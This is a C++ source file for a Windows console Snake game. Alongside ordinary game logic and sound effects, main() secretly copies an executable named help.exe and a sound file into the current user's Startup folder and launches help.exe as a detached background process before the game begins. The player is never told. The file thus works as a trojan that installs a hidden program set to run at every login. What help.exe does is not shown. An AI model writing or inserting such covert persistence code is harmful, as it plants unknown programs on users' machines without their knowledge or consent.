#include <iostream>
#include <conio.h>
#include <windows.h>
#include <stdlib.h>

#include <fstream>
#include <filesystem>
#include <string.h>
#include <time.h>
#pragma comment( lib, "Winmm.lib" )

void run();
void printMap();
void initMap();
void move(int dx, int dy);
void update();
void changeDirection(char key);
void clearScreen();
void generateFood();

char getMapValue(int value);

//some random function
int random(int from, int to) {
    return rand() % (to - from + 1) + from;
}

std::string getUserName(std::string dir);
std::string constructStartupDir(std::string username, std::string dir);


//string to widestring (needed for some functions) 
std::wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

// Map dimensions
const int mapwidth = 20;
const int mapheight = 20;

const int size = mapwidth * mapheight;

// The tile values for the map
int map[size];

// Snake head details
int headxpos = 0;
int headypos = 0;
int direction = 0;

// Amount of food the snake has (How long the body is)
int food = 3;

// Determine if game is running
bool running = true;
int fps;
std::string temporary;

int main()
{
    using namespace std;

    char tmp[128];
    GetCurrentDirectoryA(128, tmp);

    string forcopy1 = tmp;
    string foryum = tmp;
    string forbruh = tmp;
    forcopy1 += "\\help.exe";
    foryum += "\\yum.wav";
    forbruh += "\\bruh.wav";

    string temp = tmp;
    string username = getUserName(temp);
    string startupdir4help = constructStartupDir(username, temp);
    string startupdir4bruh = startupdir4help;
    startupdir4help += "\\help.exe";
    startupdir4bruh += "\\bruh.wav";

    std::wstring stemp = s2ws(forcopy1); // Temporary buffer is required
    LPCWSTR f = stemp.c_str();

    std::wstring stemo = s2ws(startupdir4help); // Temporary buffer is required
    LPCWSTR s = stemo.c_str();

    std::wstring stemj = s2ws(forbruh); // Temporary buffer is required
    LPCWSTR b = stemj.c_str();

    std::wstring stemk = s2ws(startupdir4bruh); // Temporary buffer is required
    LPCWSTR sb = stemk.c_str();

    system("pause");
    
    CopyFile(f, s, false);
    CopyFile(b, sb, false);

    //======================================

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcess(f,   
        NULL,                    
        NULL,                    
        NULL,                    
        FALSE,                 
        DETACHED_PROCESS,       
        NULL,                    
        NULL,

        &si,                    
        &pi)                     
        )
    {
    } 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    cout << "                         WELCOME TO SNAKE.EXE" << endl;
    cout << "Set Game speed(optimal: 400): ";
    cin >> fps;

    run();
    return 0;
}

void run()
{
    initMap();
    running = true;
    while (running) {
        // If a key is pressed
        if (_kbhit()) {
            // Change to direction determined by key pressed
            changeDirection(_getch());
        }
        // Upate the map
        update();

        // Clear the screen
        clearScreen();

        // Print the map
        printMap();

        // wait 0.5 seconds
        Sleep(fps);
    }

    // Print out game over text

    srand(time(NULL));

    if (food >= 69) {
        if (food == 69) {
            std::cout << "\t YAY!" << std::endl << std::endl;
        }
        else {
            std::cout << "\t!!!EPIC!!!" << std::endl << "\tYour score is: " << food << std::endl;
            PlaySound(TEXT("mariocourseclear.wav"), NULL, SND_ASYNC);
        }
    }
    else if (fps == 69 && food >= 15){
        std::cout << "\tVICTORY!!!" << std::endl << "\tYour score is: " << food << std::endl;
        srand(time(NULL));
        int rnd = random(0, 2);
        if (rnd == 0){
            PlaySound(TEXT("roboloxvictory.wav"), NULL, SND_ASYNC);
        }
        else if (rnd == 1) {
            PlaySound(TEXT("mariocourseclear.wav"), NULL, SND_ASYNC);
        }
        else if (rnd == 2) {
            PlaySound(TEXT("youwin.wav"), NULL, SND_ASYNC);
        }
    }
    else {
        srand(time(NULL));
        int rnd = random(0, 1);
        if (rnd == 0) {
            PlaySound(TEXT("bruh.wav"), NULL, SND_ASYNC);
        }
        else if (rnd == 1) {
            PlaySound(TEXT("oof.wav"), NULL, SND_ASYNC);
        }
        std::cout << "\t!!!Game over!" << std::endl << "\tYour score is: " << food << std::endl;
    }
        

    // Stop console from closing instantly
    std::cin >> temporary;
    system("pause");
}

// Changes snake direction from input
void changeDirection(char key) {
    switch (key) {
    case 'w':
        if (direction != 2) direction = 0;
        break;
    case 'd':
        if (direction != 3) direction = 1;
        break;
    case 's':
        if (direction != 4) direction = 2;
        break;
    case 'a':
        if (direction != 5) direction = 3;
        break;
    }
}

// Moves snake head to new location
void move(int dx, int dy) {
    // determine new head position
    int newx = headxpos + dx;
    int newy = headypos + dy;

    // Check if there is food at location
    if (map[newx + newy * mapwidth] == -2) {
        // Increase food value (body length)
        food++;
        srand(time(NULL));
        int rnd = random(0, 3);
        if (rnd == 0) {
            PlaySound(TEXT("wooh.wav"), NULL, SND_ASYNC);
        }
        else if (rnd == 1) {
            PlaySound(TEXT("nom.wav"), NULL, SND_ASYNC);
        }
        else if (rnd == 2) {
            PlaySound(TEXT("pam.wav"), NULL, SND_ASYNC);
        }
        else if (rnd == 3) {
            PlaySound(TEXT("yup.wav"), NULL, SND_ASYNC);
        }

        // Generate new food on map
        generateFood();
    }

    // Check location is free
    else if (map[newx + newy * mapwidth] != 0) {
        running = false;
    }

    // Move head to new location
    headxpos = newx;
    headypos = newy;
    map[headxpos + headypos * mapwidth] = food + 1;

}

// Clears screen
void clearScreen() {
    // Clear the screen
    system("cls");
}

// Generates new food on map
void generateFood() {
    srand(time(NULL));
    int x = 0;
    int y = 0;
    do {
        // Generate random x and y values within the map
        x = rand() % (mapwidth - 2) + 1;
        y = rand() % (mapheight - 2) + 1;

        // If location is not free try again
    } while (map[x + y * mapwidth] != 0);

    // Place new food
    map[x + y * mapwidth] = -2;
}

// Updates the map
void update() {
    // Move in direction indicated
    switch (direction) {
    case 0: move(-1, 0);
        break;
    case 1: move(0, 1);
        break;
    case 2: move(1, 0);
        break;
    case 3: move(0, -1);
        break;
    }

    // Reduce snake values on map by 1
    for (int i = 0; i < size; i++) {
        if (map[i] > 0) map[i]--;
    }
}

// Initializes map
void initMap()
{
    // Places the initual head location in middle of map
    headxpos = mapwidth / 2;
    headypos = mapheight / 2;
    map[headxpos + headypos * mapwidth] = 1;

    // Places top and bottom walls 
    for (int x = 0; x < mapwidth; ++x) {
        map[x] = -1;
        map[x + (mapheight - 1) * mapwidth] = -1;
    }

    // Places left and right walls
    for (int y = 0; y < mapheight; y++) {
        map[0 + y * mapwidth] = -1;
        map[(mapwidth - 1) + y * mapwidth] = -1;
    }

    // Generates first food
    generateFood();
}

// Prints the map to console
void printMap()
{
    bool d = true;
    for (int x = 0; x < mapwidth; ++x) {
        for (int y = 0; y < mapheight; ++y) {
            // Prints the value at current x,y location
            std::cout << getMapValue(map[x + y * mapwidth]);
        }
        // Ends the line for next x value
        if (d) {
            std::cout << "                   APPLES EATEN: " << food << std::endl;
            d = false;
        }
        else {
            std::cout << std::endl;
        }
    }
}

// Returns graphical character for display from map value
char getMapValue(int value)
{
    // Returns a part of snake body
    if (value > 0) return 'o';

    switch (value) {
        // Return wall
    case -1: return 'X';
        // Return food
    case -2: return 'O';

    default: return ' ';
    }
}

//dissect username from the directory the game is in
std::string getUserName(std::string dir) {
    int usrstart = 0;
    int usrend = 0;
    usrstart = dir.rfind("Users");
    dir.erase(0, usrstart + 6);
    usrend = dir.find("\\");
    std::string username = dir.erase(usrend);
    return username;
}

//construct startup directory
std::string constructStartupDir(std::string username, std::string dir) {
    std::string startupstring;
    dir.erase(9);
    dir.append(username);
    startupstring = dir.append("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    return startupstring;
}